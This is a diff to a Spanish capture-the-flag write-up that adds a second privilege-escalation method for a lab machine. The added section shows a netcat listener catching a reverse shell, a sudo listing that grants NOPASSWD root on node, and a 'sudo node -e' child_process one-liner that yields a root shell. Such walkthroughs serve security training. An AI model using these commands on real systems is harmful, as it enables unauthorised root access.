@@ -179,6 +179,30 @@ dev@tnightmarebc:~$ sudo node -e 'require("child_process").spawn("/bin/bash", {s
 root@tnightmarebc:/home/dev# 
 ```
 
+#### Opción #2: Comando
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.128.160] from (UNKNOWN) [10.128.174.143] 38510
+bash: no se puede establecer el grupo de proceso de terminal (323): Función ioctl no apropiada para el dispositivo
+bash: no hay control de trabajos en este shell
+dev@tnightmarebc:~$ sudo -l
+sudo -l
+Matching Defaults entries for dev on tnightmarebc:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User dev may run the following commands on tnightmarebc:
+    (root) NOPASSWD: /usr/bin/node
+dev@tnightmarebc:~$ sudo /usr/bin/node -e "require('child_process').execSync('/bin/bash -i', {stdio: 'inherit'})"
+<ess').execSync('/bin/bash -i', {stdio: 'inherit'})"
+bash: no se puede establecer el grupo de proceso de terminal (323): Función ioctl no apropiada para el dispositivo
+bash: no hay control de trabajos en este shell
+root@tnightmarebc:/home/dev#
+```
+
 ## Flags encontradas
 
 ### Flag de dev
